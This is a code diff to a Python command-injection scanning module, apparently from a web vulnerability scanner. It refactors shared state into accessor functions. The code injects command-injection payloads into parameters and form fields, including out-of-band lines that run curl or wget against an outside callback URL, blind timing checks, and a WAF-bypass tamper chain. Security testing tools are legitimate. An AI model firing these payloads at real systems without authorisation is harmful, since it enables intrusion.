@@ -11,7 +11,12 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 import time
 import re
 from utils.colors import log_info, log_success, log_vuln
-from utils.request import smart_request, lock, Stats, Config
+from utils.request import (
+    get_oob_client,
+    get_thread_count,
+    increment_vulnerability_count,
+    smart_request,
+)
 from modules.payloads import CMDI_PAYLOADS, CMDI_SIGNATURES
 from modules.smart_payload import probe_cmdi_context
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
@@ -72,8 +77,9 @@ def _test_cmdi_param(param, params, parsed, delay):
     else:
         all_payloads = list(CMDI_PAYLOADS)
 
-    if Config.OOB_CLIENT and Config.OOB_CLIENT.ready:
-        oob_url = Config.OOB_CLIENT.generate_payload("cmdi", param)
+    oob_client = get_oob_client()
+    if oob_client and oob_client.ready:
+        oob_url = oob_client.generate_payload("cmdi", param)
         all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])
 
     for payload in all_payloads:
@@ -87,8 +93,7 @@ def _test_cmdi_param(param, params, parsed, delay):
             resp = smart_request("get", test_url, delay=delay)
             cmd_type, sig = detect_cmdi(resp.text)
             if cmd_type:
-                with lock:
-                    Stats.vulnerabilities_found += 1
+                increment_vulnerability_count()
                 source = "🧠 Smart" if payload in smart else "📋 Static"
                 log_vuln(f"COMMAND INJECTION FOUND! [{source}]")
                 log_success(f"Param: {param} | Type: {cmd_type} | Output: {sig}")
@@ -119,8 +124,9 @@ def _test_cmdi_form_input(inp, inputs, hidden_data, method, target, delay):
     else:
         all_payloads = list(CMDI_PAYLOADS)
 
-    if Config.OOB_CLIENT and Config.OOB_CLIENT.ready:
-        oob_url = Config.OOB_CLIENT.generate_payload("cmdi", inp)
+    oob_client = get_oob_client()
+    if oob_client and oob_client.ready:
+        oob_url = oob_client.generate_payload("cmdi", inp)
         all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])
 
     for payload in all_payloads:
@@ -141,8 +147,7 @@ def _test_cmdi_form_input(inp, inputs, hidden_data, method, target, delay):
             )
             cmd_type, sig = detect_cmdi(resp.text)
             if cmd_type:
-                with lock:
-                    Stats.vulnerabilities_found += 1
+                increment_vulnerability_count()
                 source = "🧠 Smart" if payload in smart else "📋 Static"
                 log_vuln(f"COMMAND INJECTION FOUND! [{source}]")
                 log_success(f"Form field: {inp} | Type: {cmd_type}")
@@ -193,8 +198,7 @@ def _test_blind_cmdi_sequential(url, forms, delay):
                     base_elapsed = time.time() - start_base
 
                     if base_elapsed < 2.0:
-                        with lock:
-                            Stats.vulnerabilities_found += 1
+                        increment_vulnerability_count()
                         log_vuln("BLIND COMMAND INJECTION FOUND!")
                         log_success(
                             f"Param: {param} | Delay: {elapsed:.2f}s (Baseline: {base_elapsed:.2f}s)"
@@ -267,8 +271,7 @@ def _test_blind_cmdi_sequential(url, forms, delay):
                         base_elapsed = time.time() - start_base
 
                         if base_elapsed < 2.0:
-                            with lock:
-                                Stats.vulnerabilities_found += 1
+                            increment_vulnerability_count()
                             log_vuln("BLIND COMMAND INJECTION FOUND!")
                             log_success(
                                 f"Form field: {inp} | Delay: {elapsed:.2f}s (Baseline: {base_elapsed:.2f}s)"
@@ -300,7 +303,7 @@ def scan_cmdi(url, forms, delay, threads=None):
     from utils.tamper import get_tamper_chain
 
     if threads is None:
-        threads = Config.THREADS
+        threads = get_thread_count()
 
     # Apply tamper chain for WAF bypass variants
     chain = get_tamper_chain()
